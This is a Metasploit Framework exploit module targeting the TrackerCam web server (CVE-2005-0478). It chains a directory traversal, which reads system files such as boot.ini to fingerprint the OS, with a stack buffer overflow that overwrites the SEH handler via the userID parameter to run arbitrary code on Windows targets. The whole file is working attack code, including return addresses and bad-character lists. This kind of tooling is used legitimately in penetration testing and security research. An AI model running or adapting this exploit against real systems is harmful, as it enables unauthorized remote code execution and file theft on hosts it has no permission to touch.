##
# $Id: trackercam_phparg_overflow.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TrackerCam PHP Argument Buffer Overflow',
			'Description'    => %q{
					This module exploits a simple stack buffer overflow in the
				TrackerCam web server. All current versions of this software
				are vulnerable to a large number of security issues. This
				module abuses the directory traversal flaw to gain
				information about the system and then uses the PHP overflow
				to execute arbitrary code.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0478'],
					[ 'OSVDB', '13953'],
					[ 'OSVDB', '13955'],
					[ 'BID', '12592'],
					[ 'URL', 'http://aluigi.altervista.org/adv/tcambof-adv.txt'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# EyeWD.exe has a null and we can not use a partial overwrite.
					# All of the loaded application DLLs have a null in the address,
					# except CPS.dll, which moves around between instances :-(

					['Windows 2000 English',		{ 'Ret' => 0x75022ac4 }], # ws2help.dll
					['Windows XP English SP0/SP1',	{ 'Ret' => 0x71aa32ad }], # ws2help.dll
					['Windows NT 4.0 SP4/SP5/SP6',	{ 'Ret' => 0x77681799 }], # ws2help.dll

					# Windows XP SP2 and Windows 2003 are not supported yet :-/
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(8090)
			], self.class)
	end

	def check
		res = send_request_raw({
			'uri'   => '/tuner/ComGetLogFile.php3',
			'query' => 'fn=../HTTPRoot/socket.php3'
		}, 5)

		if (res and res.body =~ /fsockopen/)
			fp = fingerprint()
			print_status("Detected a vulnerable TrackerCam installation on #{fp}")
			return Exploit::CheckCode::Confirmed
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		c = connect

		buf = rand_text_english(8192)
		seh = generate_seh_payload(target.ret)
		buf[257, seh.length] = seh

		print_status("Sending request...")
		res = send_request_raw({
			'uri'   => '/tuner/TunerGuide.php3',
			'query' => 'userID=' + buf
		}, 5)

		handler
	end

	def download(path)

		res = send_request_raw({
			'uri'   => '/tuner/ComGetLogFile.php3',
			'query' => 'fn=' + ("../" * 10) + path
		}, 5)

		return if !(res and res.body and res.body =~ /tuner\.css/ and res.body =~ /<pre>/)

		m = res.match(/<pre>(.*)<\/pre><\/body>/smi)
		return if not m
		return m[1]
	end

	def fingerprint

		res = download(rand_text_alphanumeric(12) + '.txt')
		return if not res

		m = res.match(/in <b>(.*)<\/b> on line/smi)
		return if not m

		path = m[1]

		print_status("TrackerCam installation path is #{path}")

		if (path !~ /^C/i)
			print_status("TrackerCam is not installed on the system drive, we can't fingerprint it")
			return
		end

		if (path !~ /Program Files/i)
			print_status("TrackerCam is installed in a non-standard location")
		end

		boot = download('boot.ini')
		return if not boot

		case boot
			when /Windows XP.*NoExecute/i
				return "Windows XP SP2+"
			when /Windows XP/
				return "Windows XP SP0-SP1"
			when /Windows.*2003/
				return "Windows 2003"
			when /Windows.*2000/
				return "Windows 2000"
			else
				return "Unknown OS/SP"
		end
	end

end
